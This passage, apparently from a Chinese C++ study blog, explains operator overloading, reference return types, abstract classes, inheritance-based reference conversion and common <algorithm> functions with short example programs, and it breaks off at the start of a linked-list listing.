class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> MyClass&amp; lhs, <span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// 返回比较结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* 比较逻辑 */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些示例展示了如何重载常见运算符。在实际使用中，选择成员函数还是友元函数形式，通常取决于是否需要访问私有成员，以及是否希望第一个操作数是类类型的对象。总的来说，运算符重载应该谨慎使用，以保持代码的直观和易于理解。</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><h5 id="为什么选择-int-作为参数？（后置-）"><a href="#为什么选择-int-作为参数？（后置-）" class="headerlink" title="为什么选择 int 作为参数？（后置++）"></a>为什么选择 <code>int</code> 作为参数？（后置++）</h5><ol><li><strong>语法规定</strong>：C++语言规范定义了后缀递增运算符的重载必须使用一个<code>int</code>类型的参数。这个参数的存在是为了语法上的需要，以便编译器能够区分后缀递增（<code>operator++(int)</code>）和前缀递增（<code>operator++()</code>）。</li><li><strong>占位符用途</strong>：这个<code>int</code>参数实际上是一个占位符，它不需要被赋予任何实际的值。在调用后缀递增时，通常传递的是一个字面值0，但这个值在实际的运算符实现中通常是被忽略的。</li></ol><h5 id="为什么MyClass-是-？"><a href="#为什么MyClass-是-？" class="headerlink" title="为什么MyClass&amp;是&amp;？"></a>为什么MyClass&amp;是&amp;？</h5><p>在C++中，使用引用返回类型（例如 <code>MyClass&amp;</code>）在运算符重载和其他方法中是一种常见的做法，尤其是在赋值运算符和前缀递增&#x2F;递减运算符中。这样做有几个重要的原因和优势：</p><h5 id="1-避免不必要的对象复制"><a href="#1-避免不必要的对象复制" class="headerlink" title="1. 避免不必要的对象复制"></a>1. 避免不必要的对象复制</h5><p>当函数返回类型是一个对象而不是引用时，C++标准通常要求返回值被复制或移动到调用方的变量中。如果返回类型是一个引用，这种复制可以被避免。对于包含大量数据或复杂资源管理的类来说，避免这种复制是提高性能的关键。</p><h5 id="2-允许链式调用"><a href="#2-允许链式调用" class="headerlink" title="2. 允许链式调用"></a>2. 允许链式调用</h5><p>返回对象的引用允许方法调用可以被链式连接起来。这是因为返回的引用指向调用对象本身，所以可以继续在同一个表达式中对其进行操作。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.<span class="built_in">Increment</span>().<span class="built_in">SetSomething</span>(<span class="number">5</span>).<span class="built_in">DoAnotherThing</span>();</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>Increment</code>、<code>SetSomething</code> 和 <code>DoAnotherThing</code> 都可能返回 <code>MyClass&amp;</code>，允许连续调用。</p><h5 id="3-保持操作符的预期行为"><a href="#3-保持操作符的预期行为" class="headerlink" title="3. 保持操作符的预期行为"></a>3. 保持操作符的预期行为</h5><p>对于某些操作符，如赋值 (<code>=</code>)、前缀递增 (<code>++</code>) 和前缀递减 (<code>--</code>)，按照惯例和预期，这些操作应该修改原始对象，并返回修改后的对象的引用。这样，操作的结果可以直接用于其他操作，模仿了内置类型的行为。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++(++myObject);</span><br></pre></td></tr></table></figure><p>在这个表达式中，第一个 <code>++</code> 操作修改了 <code>myObject</code> 并返回了它的引用，第二个 <code>++</code> 立即作用于同一个对象。</p><h5 id="4-实现符合直觉的语义"><a href="#4-实现符合直觉的语义" class="headerlink" title="4. 实现符合直觉的语义"></a>4. 实现符合直觉的语义</h5><p>通过返回引用，你确保了操作符或方法的行为符合使用者的直觉。例如，赋值运算符通常预期能直接在赋值后使用对象，如在表达式或条件中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((a = b) == c) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，<code>a = b</code> 赋值并测试与 <code>c</code> 是否相等，这种行为是通过返回 <code>a</code> 的引用来实现的。</p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>使用 <code>MyClass&amp;</code> 作为返回类型提供了性能优势，允许链式调用，保持了操作符的预期行为，并实现了符合直觉的语义。这些都是在设计类接口时考虑使用引用作为返回类型的重要因素。</p><h3 id="抽象类and接口"><a href="#抽象类and接口" class="headerlink" title="抽象类and接口"></a>抽象类and接口</h3><p>以下是一个简单的抽象类示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;  <span class="comment">// 纯虚函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;  <span class="comment">// 纯虚函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">double</span> radius;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Circle</span>(<span class="type">double</span> r) : <span class="built_in">radius</span>(r) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Drawing a circle.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14159</span> * radius * radius;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="类的引用重写"><a href="#类的引用重写" class="headerlink" title="类的引用重写"></a>类的引用重写</h3><p>在C++中，如果类A公有地继承自类B，那么类B的指针或引用可以指向类A的对象，但反过来不行。这是因为类B只是类A的一部分，而类A包含了类B的所有特性以及额外的特性。让我们通过一个例子来更清楚地解释这一点。</p><h3 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h3><p>假设我们有一个基类 <code>Base</code> 和一个从 <code>Base</code> 公有继承的派生类 <code>Derived</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">baseMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Base method&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">derivedMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Derived method&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这种情况下，我们可以使用 <code>Derived</code> 类的对象来初始化 <code>Base</code> 类的引用或指针，因为每个 <code>Derived</code> 对象都是一个 <code>Base</code> 对象。这是多态的基础，允许 <code>Base</code> 类型的引用或指针调用在 <code>Derived</code> 类中重写的方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Derived derivedObj;</span><br><span class="line">Base &amp;baseRef = derivedObj;  <span class="comment">// 正确：Derived 对象可以被看作是 Base 对象</span></span><br><span class="line">baseRef.<span class="built_in">baseMethod</span>();        <span class="comment">// 调用 Base 的方法</span></span><br></pre></td></tr></table></figure><p>然而，反过来不行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Base baseObj;</span><br><span class="line">Derived &amp;derivedRef = baseObj;  <span class="comment">// 错误：不能将 Base 对象的引用转换为 Derived 引用</span></span><br><span class="line">derivedRef.<span class="built_in">derivedMethod</span>();     <span class="comment">// 这行代码是无效的，因为上一行已经是编译错误</span></span><br></pre></td></tr></table></figure><p>这里的错误发生是因为 <code>baseObj</code> 只是一个 <code>Base</code> 类型的对象，它可能没有 <code>Derived</code> 类中定义的额外成员和方法。尝试将一个 <code>Base</code> 类型的对象的引用转换为 <code>Derived</code> 类型的引用是不安全的，因为 <code>Derived</code> 可能有更多的数据成员或方法，这在 <code>Base</code> 对象中并不存在。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>因此，公有继承允许基类的指针或引用指向派生类的对象，但不能使用基类对象来初始化派生类的引用。这种类型的引用或指针转换是单向的，只能从派生类到基类，而不是反过来。这是面向对象设计中的一个重要安全特性，它保护了程序的类型安全性。</p><h3 id="algorithm头文件"><a href="#algorithm头文件" class="headerlink" title="algorithm头文件"></a>algorithm头文件</h3><p><code>#include &lt;algorithm&gt;</code> 是C++标准库中的一个头文件，它提供了大量的函数模板，用于处理各种算法操作，包括排序、搜索、合并、替换、旋转、反转等。以下是一些常用的函数和它们的用途：</p><ul><li><p><strong>排序</strong>：</p><ul><li><code>sort(first, last)</code>：对范围内的元素进行排序。</li><li><code>stable_sort(first, last)</code>：对范围内的元素进行稳定排序。</li></ul></li><li><p><strong>搜索</strong>：</p><ul><li><p><code>find(first, last, value)</code>：在范围内查找特定值的第一个出现位置。</p></li><li><p><code>binary_search(first, last, value)</code>：在已排序的范围内执行二分查找。</p></li></ul></li><li><p><strong>合并</strong>：</p><ul><li><code>merge(first1, last1, first2, last2, result)</code>：合并两个已排序的范围到一个新的范围。</li></ul></li><li><p><strong>替换</strong>：</p><ul><li><code>replace(first, last, old_value, new_value)</code>：将范围内的所有旧值替换为新值。</li></ul></li><li><p><strong>旋转</strong>：</p><ul><li><code>rotate(first, middle, last)</code>：将范围内的元素旋转，使得中间元素成为新的第一个元素。</li></ul></li><li><p><strong>反转</strong>：</p><ul><li><code>reverse(first, last)</code>：反转范围内元素的顺序。</li></ul></li></ul><blockquote><p>补充：</p><p>result.back()是result的末尾</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405102120585.png" alt="image-20240510204749554"></p><p>result.pop_back();移除最后一位</p><p>stoi(result);转换为int型（老pwn了）</p><p>result.substr(7)将提取从指定位置开始到字符串末尾的所有字符</p><p>result.substr(7,5)从指定位置开始读取5个字符</p></blockquote><p>在使用 <code>&lt;algorithm&gt;</code> 头文件中的函数时，对类型的要求主要涉及以下几个方面：</p><ol><li><strong>迭代器要求</strong>：<ul><li>大多数算法函数需要至少是输入迭代器（Input Iterator）的迭代器类型。这意味着你可以使用这些函数来处理任何支持输入迭代器的容器，如<code>std::vector</code>、<code>std::list</code>、<code>std::deque</code>、<code>std::array</code>等，以及普通数组。</li><li>某些算法可能需要更高级的迭代器类型，如前向迭代器（Forward Iterator）、双向迭代器（Bidirectional Iterator）或随机访问迭代器（Random Access Iterator）。例如，<code>sort()</code> 函数通常需要随机访问迭代器。</li></ul></li><li>等等（还有很多的要求主要涉及自定义类在此不过多赘述</li></ol><p><code>algorithm</code> 头文件是C++标准库中的一个重要组成部分，它提供了大量的算法，用于处理和操作容器（如数组、<code>std::vector</code>、<code>std::list</code>、<code>std::set</code>、<code>std::map</code> 等）中的元素。以下是一些 <code>algorithm</code> 头文件中常用函数的使用示例：</p><p><code>std::sort</code>：对容器中的元素进行排序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">   std::<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 对整个向量进行排序</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i : v) &#123;</span><br><span class="line">       std::cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::find</code>：在容器中查找特定元素。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">   <span class="type">int</span> target = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">auto</span> it = std::<span class="built_in">find</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), target); <span class="comment">// 查找元素3</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (it != v.<span class="built_in">end</span>()) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Element found at position: &quot;</span> &lt;&lt; (it - v.<span class="built_in">begin</span>()) &lt;&lt; std::endl;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Element not found&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::reverse</code>：反转容器中的元素顺序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">   std::<span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 反转整个向量</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i : v) &#123;</span><br><span class="line">       std::cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::max_element</code> 和 <code>std::min_element</code>：找到容器中的最大和最小元素。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">   <span class="keyword">auto</span> max_it = std::<span class="built_in">max_element</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 找到最大元素</span></span><br><span class="line">   <span class="keyword">auto</span> min_it = std::<span class="built_in">min_element</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 找到最小元素</span></span><br><span class="line"></span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;Max element: &quot;</span> &lt;&lt; *max_it &lt;&lt; std::endl;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;Min element: &quot;</span> &lt;&lt; *min_it &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些只是 <code>algorithm</code> 头文件中提供的众多算法的一小部分。使用这些算法可以大大简化对容器中元素的操作，提高代码的效率和可读性。</p><h3 id="链表-1"><a href="#链表-1" class="headerlink" title="链表"></a>链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line">C++单链表的操作</span><br><span class="line"><span class="number">2017</span><span class="number">-12</span><span class="number">-25</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 单链表.cpp: 定义控制台应用程序的入口点。</span></span><br><span class="line"> <span class="comment">//Author:kgvito </span></span><br><span class="line"> <span class="comment">//Date: 2017.12.25</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"> using namespace <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> Node ElemType</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> ERROR NULL</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//构建一个节点类</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>                          </span></span><br><span class="line"><span 